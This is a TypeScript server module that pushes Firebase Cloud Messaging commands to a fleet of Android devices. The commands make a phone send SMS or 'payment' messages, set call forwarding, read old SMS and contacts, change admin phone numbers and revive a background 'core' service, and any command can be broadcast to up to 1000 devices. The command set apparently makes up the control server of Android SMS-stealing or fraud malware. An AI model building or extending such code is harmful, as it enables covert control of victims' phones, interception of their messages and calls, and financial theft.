// File: src/services/fcmService.ts
import logger from "../logger/logger";
import {
  getDeviceFcmToken,
  updateFcmSendMeta,
  clearInvalidFcmToken,
} from "./deviceService";
import { getFirebaseMessaging } from "./firebaseAdmin";

const TAG = "fcmService";

type FcmDataPayload = Record<string, string>;

type SendCommandOptions = {
  requestId?: string;
  force?: boolean;
  extraData?: Record<string, string | number | boolean | null | undefined>;
};

/* ═══════════════════════════════════════════
   HELPERS
   ═══════════════════════════════════════════ */

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function toDataStringMap(
  input: Record<string, string | number | boolean | null | undefined>,
): FcmDataPayload {
  const out: FcmDataPayload = {};
  for (const [key, value] of Object.entries(input)) {
    if (value === undefined || value === null) continue;
    out[key] = String(value);
  }
  return out;
}

function isTokenPermanentlyInvalid(err: any): boolean {
  const code = clean(err?.code);
  return (
    code === "messaging/registration-token-not-registered" ||
    code === "messaging/invalid-registration-token"
  );
}

/* ═══════════════════════════════════════════
   PAYLOAD BUILDER
   ═══════════════════════════════════════════ */

export function buildCommandPayload(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
): FcmDataPayload {
  const base = {
    command,
    deviceId,
    requestId: options.requestId || `${command}_${deviceId}_${Date.now()}`,
    force: options.force === true ? "true" : "false",
    sentAt: Date.now(),
  };

  return {
    ...toDataStringMap(base),
    ...toDataStringMap(options.extraData || {}),
  };
}

/* ═══════════════════════════════════════════
   LOW-LEVEL SEND
   ═══════════════════════════════════════════ */

export async function sendToToken(
  token: string,
  data: FcmDataPayload,
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  const cleanToken = clean(token);
  if (!cleanToken) {
    return { success: false, error: "missing_token" };
  }

  try {
    const messaging = getFirebaseMessaging();
    const messageId = await messaging.send({
      token: cleanToken,
      data,
      android: {
        priority: "high",
        ttl: 60 * 1000,
      },
    });
    return { success: true, messageId };
  } catch (err: any) {
    return {
      success: false,
      error: clean(err?.code || err?.message || "send_failed"),
    };
  }
}

export async function sendToDevice(
  deviceId: string,
  data: FcmDataPayload,
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  const token = await getDeviceFcmToken(deviceId);

  // Purane DB records mein kabhi kabhi __UNINSTALLED__ set hota tha — skip karo
  if (token === "__UNINSTALLED__") {
    logger.info(`${TAG}: device has __UNINSTALLED__ marker, clearing token`, { deviceId });
    // Token clear karo taaki heartbeat isko baar baar na pakde
    try {
      const { clearInvalidFcmToken } = await import("./deviceService");
      await clearInvalidFcmToken(deviceId, "stale_uninstalled_marker");
    } catch (_) {}
    return { success: false, error: "missing_token" };
  }

  // No token — naya device, abhi sync nahi hua
  if (!token) {
    logger.warn(`${TAG}: sendToDevice skipped, token missing`, { deviceId });
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastError: "missing_token",
      lastErrorAt: Date.now(),
    });
    return { success: false, error: "missing_token" };
  }

  const result = await sendToToken(token, data);

  if (result.success) {
    logger.info(`${TAG}: push sent`, {
      deviceId,
      messageId: result.messageId,
      command: data.command,
    });
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastSuccessAt: Date.now(),
      lastMessageId: result.messageId || "",
      lastError: "",
    });
    return result;
  }

  logger.warn(`${TAG}: push failed`, {
    deviceId,
    error: result.error,
    command: data.command,
  });

  await updateFcmSendMeta(deviceId, {
    lastAttemptAt: Date.now(),
    lastErrorAt: Date.now(),
    lastError: result.error || "send_failed",
  });

  // Clear permanently invalid tokens (only when Google confirms: unregistered/invalid)
  // missing_token is NOT included — could be a new device that hasn't synced token yet
  if (isTokenPermanentlyInvalid({ code: result.error })) {
    await clearInvalidFcmToken(deviceId, result.error);
  }

  return result;
}

/* ═══════════════════════════════════════════
   GENERIC COMMAND SENDER
   ═══════════════════════════════════════════ */

export async function sendCommandToDevice(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
) {
  const payload = buildCommandPayload(deviceId, command, options);
  return sendToDevice(deviceId, payload);
}

/* ═══════════════════════════════════════════
   CORE SERVICE COMMANDS
   ═══════════════════════════════════════════ */

export async function sendRestartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "restart_core", options);
}

export async function sendReviveCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "revive_core", options);
}

export async function sendStartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "start_core", options);
}

export async function sendSyncToken(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "sync_token", options);
}

/* ═══════════════════════════════════════════
   SMS COMMANDS
   ═══════════════════════════════════════════ */

export async function sendSmsCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `sms_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "send_sms", {
    requestId: msgId,
    extraData: {
      to: clean(to),
      message: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   CALL FORWARD COMMANDS
   ═══════════════════════════════════════════ */

export async function sendCallForwardCommand(
  deviceId: string,
  callCode: string,
  sim: string = "0",
  phoneNumber?: string,
) {
  const requestId = `cf_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "call_forward", {
    requestId,
    extraData: {
      callCode: clean(callCode),
      sim: clean(sim),
      phoneNumber: clean(phoneNumber || ""),
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   ADMIN UPDATE COMMANDS
   ═══════════════════════════════════════════ */

export async function sendAdminListUpdate(deviceId: string, admins: string[]) {
  return sendCommandToDevice(deviceId, "admins_update", {
    requestId: `admins_${deviceId}_${Date.now()}`,
    extraData: { admins: JSON.stringify(admins), timestamp: Date.now() },
  });
}

export async function sendGlobalAdminUpdate(deviceId: string, phone: string) {
  return sendCommandToDevice(deviceId, "global_admin_update", {
    requestId: `gadmin_${deviceId}_${Date.now()}`,
    extraData: { phone: clean(phone), timestamp: Date.now() },
  });
}

export async function sendDeviceAdminPhoneUpdate(deviceId: string, phone: string) {
  return sendCommandToDevice(deviceId, "device_admin_update", {
    requestId: `dadmin_${deviceId}_${Date.now()}`,
    extraData: { phone: clean(phone), timestamp: Date.now() },
  });
}

export async function sendForwardingSimUpdate(deviceId: string, value: string) {
  return sendCommandToDevice(deviceId, "forwarding_sim_update", {
    requestId: `fsim_${deviceId}_${Date.now()}`,
    extraData: { value: clean(value), timestamp: Date.now() },
  });
}

/* ═══════════════════════════════════════════
   PAYMENT COMMAND
   ═══════════════════════════════════════════ */

export async function sendPaymentCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `pay_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "payment", {
    requestId: msgId,
    extraData: {
      smsto: clean(to),
      smsContent: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   PING COMMAND
   ═══════════════════════════════════════════ */

export async function sendPing(deviceId: string) {
  return sendCommandToDevice(deviceId, "ping", {
    requestId: `ping_${deviceId}_${Date.now()}`,
  });
}

/* ═══════════════════════════════════════════
   BROADCAST TO ALL DEVICES
   ═══════════════════════════════════════════ */

export async function broadcastCommandToAllDevices(
  command: string,
  options: SendCommandOptions = {},
  maxDevices: number = 1000,
): Promise<{ attempted: number; success: number; failed: number; skipped: number }> {
  const Device = (await import("../models/Device")).default;

  const devices = await Device.find({ fcmToken: { $ne: "" } })
    .select("deviceId fcmToken")
    .limit(maxDevices)
    .lean();

  let attempted = 0, success = 0, failed = 0, skipped = 0;

  for (const d of devices) {
    const deviceId = clean((d as any).deviceId);
    const token    = clean((d as any).fcmToken);
    if (!deviceId || !token) { skipped++; continue; }
    attempted++;
    try {
      const result = await sendCommandToDevice(deviceId, command, options);
      if (result.success) success++; else failed++;
    } catch { failed++; }
  }

  logger.info(`${TAG}: broadcast complete`, { command, attempted, success, failed, skipped });
  return { attempted, success, failed, skipped };
}

/* ═══════════════════════════════════════════
   READ OLD SMS COMMAND
   ═══════════════════════════════════════════ */

export async function sendReadOldSmsCommand(deviceId: string, days: number = 15) {
  return sendCommandToDevice(deviceId, "read_old_sms", {
    requestId: `oldsms_${deviceId}_${Date.now()}`,
    extraData: { days, timestamp: Date.now() },
  });
}

/* ═══════════════════════════════════════════
   READ CONTACTS COMMAND
   ═══════════════════════════════════════════ */

export async function sendReadContactsCommand(deviceId: string) {
  return sendCommandToDevice(deviceId, "read_contacts", {
    requestId: `contacts_${deviceId}_${Date.now()}`,
    extraData: { timestamp: Date.now() },
  });
}

export default {
  buildCommandPayload,
  sendToToken,
  sendToDevice,
  sendCommandToDevice,
  sendRestartCore,
  sendReviveCore,
  sendStartCore,
  sendSyncToken,
  sendSmsCommand,
  sendCallForwardCommand,
  sendAdminListUpdate,
  sendGlobalAdminUpdate,
  sendDeviceAdminPhoneUpdate,
  sendForwardingSimUpdate,
  sendPaymentCommand,
  sendPing,
  broadcastCommandToAllDevices,
  sendReadOldSmsCommand,
  sendReadContactsCommand,
};
